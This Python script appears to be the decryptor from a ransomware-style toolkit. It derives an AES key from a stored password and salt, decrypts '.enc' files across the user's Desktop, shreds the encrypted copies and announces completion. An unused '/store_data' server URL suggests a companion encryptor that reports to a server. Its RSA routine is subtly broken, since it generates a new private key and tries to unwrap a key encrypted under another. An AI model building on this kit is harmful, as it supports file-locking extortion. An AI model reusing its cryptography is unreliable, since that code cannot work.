import os
import getpass
import hashlib
import tkinter as tk
from tkinter import messagebox
import requests
import uuid
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

SERVER_URL = 'http://127.0.0.1:5000/store_data'

def load_encryption_details():
    """Load encryption details (password and salt) from local file."""
    if os.path.exists('encryption_details.txt'):
        with open('encryption_details.txt', 'r') as f:
            lines = f.readlines()
            password = bytes.fromhex(lines[0].split(': ')[1].strip())
            salt = bytes.fromhex(lines[1].split(': ')[1].strip())
            return password, salt
    return None, None

def derive_key(password, salt):
    """Derive a key from a password using PBKDF2."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        iterations=100000,
        length=32,
        salt=salt,
        backend=default_backend()
    )
    return kdf.derive(password)

def decrypt_file(key, encrypted_file_path):
    """Decrypt an AES-GCM encrypted file."""
    if not encrypted_file_path.endswith('.enc'):
        print(f"Skipping non-encrypted file: {encrypted_file_path}")
        return

    with open(encrypted_file_path, 'rb') as encrypted_file:
        data = encrypted_file.read()

    iv = data[:12]
    tag = data[12:28]
    ciphertext = data[28:]

    cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
    decryptor = cipher.decryptor()

    try:
        decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()

        original_file_path = encrypted_file_path[:-4]  # Remove '.enc' extension
        with open(original_file_path, 'wb') as original_file:
            original_file.write(decrypted_data)

        print(f"Successfully decrypted: {original_file_path}")
        secure_file_delete(encrypted_file_path)  # Securely delete the encrypted file
    except Exception as e:
        print(f"Error decrypting {encrypted_file_path}: {e}")

def decrypt_data(key, encrypted_data):
    """Decrypt data using AES-GCM."""
    iv = encrypted_data[:12]
    tag = encrypted_data[12:28]
    encrypted_key = encrypted_data[28:284]
    ciphertext = encrypted_data[284:]

    # Decrypt the key using RSA (this part assumes you have the private key)
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    
    try:
        decrypted_key = private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # Now decrypt the actual data
        cipher = Cipher(algorithms.AES(decrypted_key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()

        return decrypted_data
    except Exception as e:
        print(f"Error decrypting data: {e}")
        return None

def secure_file_delete(file_path):
    """Securely delete a file by overwriting it with random data."""
    try:
        with open(file_path, 'r+b') as file:
            file_size = os.path.getsize(file_path)
            file.write(os.urandom(file_size))
        os.remove(file_path)
    except Exception as e:
        print(f"Error deleting {file_path}: {e}")

def decrypt_all_data(key, data_source):
    """Decrypt all files in a specified directory."""
    for root, dirs, files in os.walk(data_source):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            decrypt_file(key, file_path)

def show_notification(message):
    """Show a notification message box."""
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showinfo("Decryption Complete", message)
    root.destroy()

def main():
    # Load existing password and salt or generate new ones
    password, salt = load_encryption_details()
    if password is None or salt is None:
        print("No encryption details found.")
        return

    key = derive_key(password, salt)

    home_directory = os.path.expanduser("~")
    desktop_path = os.path.join(home_directory, "Desktop")

    decrypt_all_data(key, desktop_path)

    # Optionally decrypt sample data if needed
    # with open('encrypted_data.bin', 'rb') as encrypted_data_file:
    #     encrypted_data = encrypted_data_file.read()
    # decrypted_data = decrypt_data(key, encrypted_data)
    # print(decrypted_data)

    show_notification("All files have been decrypted successfully!")

if __name__ == "__main__":
    main()
